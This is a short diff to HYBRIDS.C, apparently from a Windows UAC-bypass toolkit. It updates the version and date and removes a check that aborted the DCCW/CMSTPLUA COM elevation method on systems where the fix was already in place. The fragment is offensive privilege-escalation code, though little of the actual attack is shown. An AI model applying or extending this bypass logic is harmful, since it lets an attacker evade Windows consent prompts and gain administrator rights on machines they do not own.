@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.57
+*  VERSION:     3.58
 *
-*  DATE:        01 Nov 2021
+*  DATE:        01 Dec 2021
 *
 *  Hybrid UAC bypass methods.
 *
@@ -880,7 +880,6 @@ NTSTATUS ucmDccwCOMMethod(
 {
     NTSTATUS         MethodResult = STATUS_ACCESS_DENIED;
     HRESULT          r = E_FAIL, hr_init;
-    BOOL             bIntApproved1 = FALSE, bIntApproved2 = FALSE;
 
     SIZE_T           sz = 0;
 
@@ -890,17 +889,6 @@ NTSTATUS ucmDccwCOMMethod(
     hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
     do {
-        //
-        // Potential fix check.
-        //
-        if (supIsConsentApprovedInterface(T_CLSID_ColorDataProxy, &bIntApproved1)) {
-            if (supIsConsentApprovedInterface(T_CLSID_CMSTPLUA, &bIntApproved2))
-                if ((bIntApproved1 == FALSE) || (bIntApproved2 == FALSE)) {
-                    MethodResult = STATUS_NOINTERFACE;
-                    break;
-                }
-        }
-
 
         sz = _strlen(lpszPayload);
         if (sz == 0) {
